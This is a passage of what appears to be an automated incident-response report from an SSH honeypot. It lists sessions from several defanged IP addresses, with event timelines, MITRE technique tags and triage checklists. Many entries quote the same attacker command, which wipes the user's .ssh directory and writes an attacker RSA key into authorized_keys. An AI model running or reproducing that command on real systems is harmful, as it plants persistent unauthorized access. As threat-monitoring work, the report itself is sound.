| `2026-06-09 09:57:45` | `cowrie.client.kex` |
| `2026-06-09 09:57:45` | `cowrie.login.success` |
| `2026-06-09 09:57:46` | `cowrie.session.params` |
| `2026-06-09 09:57:46` | `cowrie.command.input` |
| `2026-06-09 09:57:46` | `cowrie.command.failed` |
| `2026-06-09 09:57:46` | `cowrie.log.closed` |
| `2026-06-09 09:57:46` | `cowrie.session.params` |
| `2026-06-09 09:57:46` | `cowrie.command.input` |
| `2026-06-09 09:57:46` | `cowrie.session.file_download` |
| `2026-06-09 09:57:46` | `cowrie.log.closed` |
| `2026-06-09 09:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf570e38a102

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:57 |
| **Last Seen** | 2026-06-09 09:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:57:48` | `cowrie.session.connect` |
| `2026-06-09 09:57:48` | `cowrie.client.version` |
| `2026-06-09 09:57:48` | `cowrie.client.kex` |
| `2026-06-09 09:57:49` | `cowrie.login.success` |
| `2026-06-09 09:57:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a4f4a647b10

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:58 |
| **Last Seen** | 2026-06-09 09:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:58:33` | `cowrie.session.connect` |
| `2026-06-09 09:58:33` | `cowrie.client.version` |
| `2026-06-09 09:58:33` | `cowrie.client.kex` |
| `2026-06-09 09:58:34` | `cowrie.login.success` |
| `2026-06-09 09:58:35` | `cowrie.session.params` |
| `2026-06-09 09:58:35` | `cowrie.command.input` |
| `2026-06-09 09:58:35` | `cowrie.command.failed` |
| `2026-06-09 09:58:35` | `cowrie.log.closed` |
| `2026-06-09 09:58:36` | `cowrie.session.params` |
| `2026-06-09 09:58:36` | `cowrie.command.input` |
| `2026-06-09 09:58:36` | `cowrie.session.file_download` |
| `2026-06-09 09:58:36` | `cowrie.log.closed` |
| `2026-06-09 09:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ba6be12232c

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:58 |
| **Last Seen** | 2026-06-09 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:58:39` | `cowrie.session.connect` |
| `2026-06-09 09:58:39` | `cowrie.client.version` |
| `2026-06-09 09:58:39` | `cowrie.client.kex` |
| `2026-06-09 09:58:41` | `cowrie.login.success` |
| `2026-06-09 09:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21fd77b2cfbc

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 10:01 |
| **Last Seen** | 2026-06-09 10:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:01:39` | `cowrie.session.connect` |
| `2026-06-09 10:01:39` | `cowrie.client.version` |
| `2026-06-09 10:01:39` | `cowrie.client.kex` |
| `2026-06-09 10:01:39` | `cowrie.login.success` |
| `2026-06-09 10:01:40` | `cowrie.session.params` |
| `2026-06-09 10:01:40` | `cowrie.command.input` |
| `2026-06-09 10:01:40` | `cowrie.command.failed` |
| `2026-06-09 10:01:40` | `cowrie.log.closed` |
| `2026-06-09 10:01:40` | `cowrie.session.params` |
| `2026-06-09 10:01:40` | `cowrie.command.input` |
| `2026-06-09 10:01:40` | `cowrie.session.file_download` |
| `2026-06-09 10:01:40` | `cowrie.log.closed` |
| `2026-06-09 10:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6942d0cec923

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 10:01 |
| **Last Seen** | 2026-06-09 10:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:01:42` | `cowrie.session.connect` |
| `2026-06-09 10:01:42` | `cowrie.client.version` |
| `2026-06-09 10:01:42` | `cowrie.client.kex` |
| `2026-06-09 10:01:42` | `cowrie.login.success` |
| `2026-06-09 10:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de4a83bdbf88

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 10:02 |
| **Last Seen** | 2026-06-09 10:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:02:12` | `cowrie.session.connect` |
| `2026-06-09 10:02:12` | `cowrie.client.version` |
| `2026-06-09 10:02:12` | `cowrie.client.kex` |
| `2026-06-09 10:02:13` | `cowrie.login.success` |
| `2026-06-09 10:02:14` | `cowrie.session.params` |
| `2026-06-09 10:02:14` | `cowrie.command.input` |
| `2026-06-09 10:02:14` | `cowrie.command.failed` |
| `2026-06-09 10:02:14` | `cowrie.log.closed` |
| `2026-06-09 10:02:15` | `cowrie.session.params` |
| `2026-06-09 10:02:15` | `cowrie.command.input` |
| `2026-06-09 10:02:15` | `cowrie.session.file_download` |
| `2026-06-09 10:02:15` | `cowrie.log.closed` |
| `2026-06-09 10:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f7f8d0e189f

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 10:02 |
| **Last Seen** | 2026-06-09 10:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:02:18` | `cowrie.session.connect` |
| `2026-06-09 10:02:18` | `cowrie.client.version` |
| `2026-06-09 10:02:18` | `cowrie.client.kex` |
| `2026-06-09 10:02:20` | `cowrie.login.success` |
| `2026-06-09 10:02:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04522bfc9998

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 10:02 |
| **Last Seen** | 2026-06-09 10:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:02:26` | `cowrie.session.connect` |
| `2026-06-09 10:02:26` | `cowrie.client.version` |
| `2026-06-09 10:02:26` | `cowrie.client.kex` |
| `2026-06-09 10:02:28` | `cowrie.login.success` |
| `2026-06-09 10:02:28` | `cowrie.session.params` |
| `2026-06-09 10:02:28` | `cowrie.command.input` |
| `2026-06-09 10:02:28` | `cowrie.command.failed` |
| `2026-06-09 10:02:29` | `cowrie.log.closed` |
| `2026-06-09 10:02:29` | `cowrie.session.params` |
| `2026-06-09 10:02:29` | `cowrie.command.input` |
| `2026-06-09 10:02:30` | `cowrie.session.file_download` |
| `2026-06-09 10:02:30` | `cowrie.log.closed` |
| `2026-06-09 10:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ea8a259e3e1

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 10:02 |
| **Last Seen** | 2026-06-09 10:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:02:33` | `cowrie.session.connect` |
| `2026-06-09 10:02:33` | `cowrie.client.version` |
| `2026-06-09 10:02:34` | `cowrie.client.kex` |
| `2026-06-09 10:02:35` | `cowrie.login.success` |
| `2026-06-09 10:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ff2ff32ff0b

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 10:02 |
| **Last Seen** | 2026-06-09 10:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:02:56` | `cowrie.session.connect` |
| `2026-06-09 10:02:56` | `cowrie.client.version` |
| `2026-06-09 10:02:56` | `cowrie.client.kex` |
| `2026-06-09 10:02:57` | `cowrie.login.success` |
| `2026-06-09 10:02:57` | `cowrie.session.params` |
| `2026-06-09 10:02:57` | `cowrie.command.input` |
| `2026-06-09 10:02:57` | `cowrie.command.failed` |
| `2026-06-09 10:02:57` | `cowrie.log.closed` |
| `2026-06-09 10:02:58` | `cowrie.session.params` |
| `2026-06-09 10:02:58` | `cowrie.command.input` |
| `2026-06-09 10:02:58` | `cowrie.session.file_download` |
| `2026-06-09 10:02:58` | `cowrie.log.closed` |
| `2026-06-09 10:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7095a7f29466

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 10:03 |
| **Last Seen** | 2026-06-09 10:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:03:00` | `cowrie.session.connect` |
| `2026-06-09 10:03:00` | `cowrie.client.version` |
| `2026-06-09 10:03:00` | `cowrie.client.kex` |
| `2026-06-09 10:03:00` | `cowrie.login.success` |
| `2026-06-09 10:03:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c85263bf967d

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 10:04 |
| **Last Seen** | 2026-06-09 10:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:04:39` | `cowrie.session.connect` |
| `2026-06-09 10:04:39` | `cowrie.client.version` |
| `2026-06-09 10:04:39` | `cowrie.client.kex` |
| `2026-06-09 10:04:40` | `cowrie.login.success` |
| `2026-06-09 10:04:41` | `cowrie.session.params` |
| `2026-06-09 10:04:41` | `cowrie.command.input` |
| `2026-06-09 10:04:41` | `cowrie.command.failed` |
| `2026-06-09 10:04:42` | `cowrie.log.closed` |
| `2026-06-09 10:04:42` | `cowrie.session.params` |
| `2026-06-09 10:04:42` | `cowrie.command.input` |
| `2026-06-09 10:04:42` | `cowrie.session.file_download` |
| `2026-06-09 10:04:42` | `cowrie.log.closed` |
| `2026-06-09 10:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8515db7c72f4

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 10:04 |
| **Last Seen** | 2026-06-09 10:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:04:46` | `cowrie.session.connect` |
| `2026-06-09 10:04:46` | `cowrie.client.version` |
| `2026-06-09 10:04:46` | `cowrie.client.kex` |
| `2026-06-09 10:04:47` | `cowrie.login.success` |
| `2026-06-09 10:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b7250ea9b5

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 10:05 |
| **Last Seen** | 2026-06-09 10:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:05:59` | `cowrie.session.connect` |
| `2026-06-09 10:05:59` | `cowrie.client.version` |
| `2026-06-09 10:06:00` | `cowrie.client.kex` |
| `2026-06-09 10:06:01` | `cowrie.login.success` |
| `2026-06-09 10:06:02` | `cowrie.session.params` |
| `2026-06-09 10:06:02` | `cowrie.command.input` |
| `2026-06-09 10:06:02` | `cowrie.command.failed` |
| `2026-06-09 10:06:02` | `cowrie.log.closed` |
| `2026-06-09 10:06:03` | `cowrie.session.params` |
| `2026-06-09 10:06:03` | `cowrie.command.input` |
| `2026-06-09 10:06:03` | `cowrie.session.file_download` |
| `2026-06-09 10:06:03` | `cowrie.log.closed` |
| `2026-06-09 10:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1bf3c325c78

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 10:06 |
| **Last Seen** | 2026-06-09 10:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:06:06` | `cowrie.session.connect` |
| `2026-06-09 10:06:06` | `cowrie.client.version` |
| `2026-06-09 10:06:06` | `cowrie.client.kex` |
| `2026-06-09 10:06:08` | `cowrie.login.success` |
| `2026-06-09 10:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8dafb05d431

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 10:06 |
| **Last Seen** | 2026-06-09 10:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:06:51` | `cowrie.session.connect` |
| `2026-06-09 10:06:51` | `cowrie.client.version` |
| `2026-06-09 10:06:51` | `cowrie.client.kex` |
| `2026-06-09 10:06:52` | `cowrie.login.success` |
| `2026-06-09 10:06:53` | `cowrie.session.params` |
| `2026-06-09 10:06:53` | `cowrie.command.input` |
| `2026-06-09 10:06:53` | `cowrie.command.failed` |
| `2026-06-09 10:06:53` | `cowrie.log.closed` |
| `2026-06-09 10:06:54` | `cowrie.session.params` |
| `2026-06-09 10:06:54` | `cowrie.command.input` |
| `2026-06-09 10:06:54` | `cowrie.session.file_download` |
| `2026-06-09 10:06:54` | `cowrie.log.closed` |
| `2026-06-09 10:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bbe9c0d5503

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 10:06 |
| **Last Seen** | 2026-06-09 10:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 10:06:58` | `cowrie.session.connect` |
| `2026-06-09 10:06:58` | `cowrie.client.version` |
| `2026-06-09 10:06:58` | `cowrie.client.kex` |
| `2026-06-09 10:06:59` | `cowrie.login.success` |
| `2026-06-09 10:07:00` | `cowrie.session.closed` |

**Recommended Actions:**
